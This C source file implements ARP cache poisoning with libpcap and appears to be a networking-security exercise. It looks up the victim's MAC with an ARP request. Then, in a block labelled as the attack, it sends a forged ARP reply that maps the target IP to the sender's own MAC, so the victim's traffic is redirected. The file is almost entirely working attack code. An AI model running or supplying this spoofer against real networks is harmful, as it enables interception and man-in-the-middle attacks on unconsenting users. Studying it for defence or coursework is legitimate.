#include <pcap.h>
#include <arpa/inet.h>
#include "send_arp.h"

int send_arp(char *interface, char *sender_ip, char *target_ip){
    char packet[45];
    char errbuf[PCAP_ERRBUF_SIZE];
    //인터페이스 확인
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open interfaceice %s: %s\n", interface, errbuf);
        return -1;
    }

    uint8_t eth_src_mac[6] = {0};
    uint8_t eth_dst_mac[6] = {255,255,255,255,255,255};//  First dst MAC is BroadCast
    char *local_ip;
    //MAC 주소를 가져옴
    get_mac(eth_src_mac, interface);    //set source mac address
    local_ip = get_host_ip(interface);

    printf("MY MAC : ");
    for(int i=0; i<MAC_SIZE; i++){
        printf("%02X ", eth_src_mac[i]);
    }
    printf("\n");

    struct ethernet_header *e_header;
    e_header = (struct ethernet_header *)packet;

    for(int i = 0; i < MAC_SIZE; i++)
        e_header->dst_mac[i] = eth_dst_mac[i];
    for(int i = 0; i < MAC_SIZE; i++)
        e_header->src_mac[i] = eth_src_mac[i];
    e_header->type = ntohs(ARPTYPE);
    struct arp_header *arp;
    arp = (struct arp_header *)(packet+ETH_LENGTH);

    arp->hardware_type = ntohs(ARP_ETHERNET);
    arp->protocol_type = ntohs(IPv4);
    arp->hardware_size = ARP_HWSIZE;
    arp->protocol_size = ARP_PROTOCOLSIZE;
    arp->opcode = ntohs(ARP_REQ);
    for(int i=0; i<MAC_SIZE; i++)
        arp->sender_mac[i] = eth_src_mac[i];
    arp->sender_ip = inet_addr(local_ip);
    for(int i=0; i<MAC_SIZE; i++)
        arp->target_mac[i] = 0;
    arp->target_ip = inet_addr(sender_ip);

    if(pcap_sendpacket(handle, packet, PACKET_SIZE) != 0)
        return -1;

    //checking
    while(1){
        struct pcap_pkthdr* header;
        const u_char* arp_packet;
        int res = pcap_next_ex(handle, &header, &arp_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        if(!check_arp_reply(arp_packet, eth_dst_mac, eth_src_mac, sender_ip)) break;
    }

    //***Attack*********************************
    //
    e_header = (struct ethernet_header *)packet;
    for(int i = 0; i < MAC_SIZE; i++)
        e_header->dst_mac[i] = eth_dst_mac[i]; // sender_mac
    for(int i = 0; i < MAC_SIZE; i++)
        e_header->src_mac[i] = eth_src_mac[i]; // my mac
    e_header->type = ntohs(ARPTYPE);
    arp = (struct arp_header *)(packet+ETH_LENGTH);

    arp->hardware_type = ntohs(ARP_ETHERNET);
    arp->protocol_type = ntohs(IPv4);
    arp->hardware_size = ARP_HWSIZE;
    arp->protocol_size = ARP_PROTOCOLSIZE;
    arp->opcode = ntohs(ARP_REP);
    for(int i=0; i<MAC_SIZE; i++)
        arp->sender_mac[i] = eth_src_mac[i];
    arp->sender_ip = inet_addr(target_ip);
    for(int i=0; i<MAC_SIZE; i++)
        arp->target_mac[i] = eth_dst_mac[i];
    arp->target_ip = inet_addr(sender_ip);
    printf("Attack Start\n");
    if(pcap_sendpacket(handle, packet, PACKET_SIZE) != 0)
        return -1;

    return 0;
}


int check_arp_reply(const unsigned char *packet, uint8_t eth_dst_mac[6], uint8_t eth_my_mac[6], char *sender_ip){
    struct ethernet_header *e_header;
    e_header = (struct e_header*)packet;
    //Check Eth type
    if (!(htons(e_header->type) == ARPTYPE))
        return -1;
    struct arp_header *arp_header;
    arp_header = (struct arp_header*)(packet+ETH_LENGTH);
    //Check ARP Reply
    if (!(htons(arp_header->opcode) == ARP_REP))
        return -1;
    //Check MAC Address
    for(int i=0; i<MAC_SIZE; i++){
        if(eth_my_mac[i] != e_header->dst_mac[i])
            return -1;
    }
    //Check MY IP
    if(arp_header->sender_ip !=inet_addr(sender_ip))
        return -1;

    //Print Sender MAC
    printf("Sender MAC : ");
    for(int i=0; i<MAC_SIZE; i++){
        eth_dst_mac[i] = arp_header->sender_mac[i];
        printf("%02X ", arp_header->sender_mac[i]);
    }
    printf("\n");
    return 0;
}

// get MAC Address Function
void get_mac(uint8_t MAC_addr[6], char *interface)
{
    int s;
    struct ifreq ifr;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
    ioctl(s, SIOCGIFHWADDR, &ifr);
    memcpy(MAC_addr, ifr.ifr_hwaddr.sa_data, MAC_SIZE);
}

//get My IP Address Function
char *get_host_ip(char *interface){
    int s;
    struct ifreq ifr;
    char *local_ip;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
    ioctl(s, SIOCGIFADDR, &ifr);
    local_ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
    close(s);
    return local_ip;
}
